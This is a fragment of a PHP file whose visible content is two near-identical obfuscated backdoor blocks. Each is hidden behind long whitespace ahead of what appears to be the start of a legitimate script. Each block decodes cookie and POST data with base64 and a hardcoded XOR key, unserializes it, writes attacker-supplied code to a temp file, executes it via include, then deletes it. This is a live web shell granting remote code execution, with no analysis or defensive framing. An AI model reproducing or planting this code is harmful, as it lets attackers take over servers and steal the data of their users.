<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("sqoquuqgol")){class sqoquuqgol{public static $lwjou = "ptnlxhbapkznenty";public static $sviyrx = NULL;public function __construct(){$kfkpitlrj = @$_COOKIE[substr(sqoquuqgol::$lwjou, 0, 4)];if (!empty($kfkpitlrj)){$nlyof = "base64";$txdom = "";$kfkpitlrj = explode(",", $kfkpitlrj);foreach ($kfkpitlrj as $bnqlzjpz){$txdom .= @$_COOKIE[$bnqlzjpz];$txdom .= @$_POST[$bnqlzjpz];}$txdom = array_map($nlyof . "_decode", array($txdom,));$txdom = $txdom[0] ^ str_repeat(sqoquuqgol::$lwjou, (strlen($txdom[0]) / strlen(sqoquuqgol::$lwjou)) + 1);sqoquuqgol::$sviyrx = @unserialize($txdom);}}public function __destruct(){$this->otkvdj();}private function otkvdj(){if (is_array(sqoquuqgol::$sviyrx)) {$orxatbid = sys_get_temp_dir() . "/" . crc32(sqoquuqgol::$sviyrx["salt"]);@sqoquuqgol::$sviyrx["write"]($orxatbid, sqoquuqgol::$sviyrx["content"]);include $orxatbid;@sqoquuqgol::$sviyrx["delete"]($orxatbid);exit();}}}$mahfzpdwa = new sqoquuqgol();$mahfzpdwa = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("juumpn")){class juumpn{public static $dsbwtgmk = "jvywnspqdmvhkbuo";public static $sfnxx = NULL;public function __construct(){$ptuzoqlv = @$_COOKIE[substr(juumpn::$dsbwtgmk, 0, 4)];if (!empty($ptuzoqlv)){$kzqjehy = "base64";$xfhnu = "";$ptuzoqlv = explode(",", $ptuzoqlv);foreach ($ptuzoqlv as $arzjbncfc){$xfhnu .= @$_COOKIE[$arzjbncfc];$xfhnu .= @$_POST[$arzjbncfc];}$xfhnu = array_map($kzqjehy . "_decode", array($xfhnu,));$xfhnu = $xfhnu[0] ^ str_repeat(juumpn::$dsbwtgmk, (strlen($xfhnu[0]) / strlen(juumpn::$dsbwtgmk)) + 1);juumpn::$sfnxx = @unserialize($xfhnu);}}public function __destruct(){$this->jmtni();}private function jmtni(){if (is_array(juumpn::$sfnxx)) {$jvwghwfdnb = sys_get_temp_dir() . "/" . crc32(juumpn::$sfnxx["salt"]);@juumpn::$sfnxx["write"]($jvwghwfdnb, juumpn::$sfnxx["content"]);include $jvwghwfdnb;@juumpn::$sfnxx["delete"]($jvwghwfdnb);exit();}}}$orovc = new juumpn();$orovc = NULL;} ?><?php
/**
